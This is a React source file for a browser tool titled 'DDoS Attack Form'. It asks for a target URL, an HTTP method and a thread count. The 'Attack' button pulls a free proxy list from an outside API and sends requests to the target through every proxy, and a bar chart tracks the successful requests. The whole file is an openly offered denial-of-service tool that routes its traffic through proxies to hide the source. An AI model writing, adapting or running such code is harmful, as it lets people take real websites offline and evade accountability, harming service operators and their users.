import React, { useState, useEffect } from 'react';
import axios from 'axios';
import Chart from 'chart.js/auto';

function App() {
  const [url, setUrl] = useState('');
  const [method, setMethod] = useState('GET');
  const [threads, setThreads] = useState(1);
  const [successfulRequests, setSuccessfulRequests] = useState(0);

  const handleAttack = async () => {
    try {
      // Fetch proxies from the API
      const response = await axios.get('https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=all&country=all&anonymity=all&timeout=20000&proxy_format=ipport&format=text');
      const proxies = response.data.split('\n');

      // Send requests using proxies
      proxies.forEach(async (proxy) => {
        try {
          await axios({
            method: method,
            url: url,
            proxy: {
              host: proxy.split(':')[0],
              port: proxy.split(':')[1]
            }
          });
          console.log('Request sent using proxy:', proxy);
        } catch (error) {
          console.error('Failed to send request using proxy:', proxy);
        }
      });
    } catch (error) {
      console.error('Failed to fetch proxies:', error);
    }
  };

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await axios.get('/successful-requests');
        setSuccessfulRequests(response.data.successfulRequests);
      } catch (error) {
        console.error('Failed to fetch successful requests:', error);
      }
    };

    fetchData();
  }, []);

  useEffect(() => {
    const ctx = document.getElementById('myChart');
    new Chart(ctx, {
      type: 'bar',
      data: {
        labels: ['Successful Requests'],
        datasets: [{
          label: 'Successful Requests',
          data: [successfulRequests],
          backgroundColor: 'rgba(75, 192, 192, 0.2)',
          borderColor: 'rgba(75, 192, 192, 1)',
          borderWidth: 1
        }]
      },
      options: {
        scales: {
          y: {
            beginAtZero: true
          }
        }
      }
    });
  }, [successfulRequests]);

  return (
    <div>
      <h1>DDoS Attack Form</h1>
      <label>
        URL:
        <input type="text" value={url} onChange={(e) => setUrl(e.target.value)} />
      </label>
      <br />
      <label>
        Method:
        <select value={method} onChange={(e) => setMethod(e.target.value)}>
          <option value="GET">GET</option>
          <option value="POST">POST</option>
          {/* Add other methods as needed */}
        </select>
      </label>
      <br />
      <label>
        Threads:
        <input type="number" value={threads} onChange={(e) => setThreads(e.target.value)} />
      </label>
      <br />
      <button onClick={handleAttack}>Attack</button>
      <div>
        <h1>Successful Requests Graph</h1>
        <canvas id="myChart" width="400" height="400"></canvas>
      </div>
    </div>
  );
}

export default App;
         
